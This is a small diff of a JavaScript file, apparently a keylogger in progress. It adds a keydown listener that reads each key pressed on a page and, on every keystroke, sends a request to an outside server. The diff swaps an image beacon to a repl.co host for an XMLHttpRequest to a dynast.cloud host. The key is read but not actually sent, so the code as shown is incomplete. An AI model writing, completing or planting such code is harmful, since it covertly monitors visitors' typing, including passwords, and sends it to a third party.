@@ -1,5 +1,6 @@
 document.addEventListener('keydown', (event) => {
     const key = event.key; // Obter a tecla pressionada
-    const img = new Image();
-    img.src = 'https://ea3baf39-e1e9-4737-9c28-8a869b79c933-00-1spc09uux8b1t.riker.repl.co/';
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://sao-paulo-0-alpaca.dynast.cloud:8443/', true);
+    xhr.send();
 });
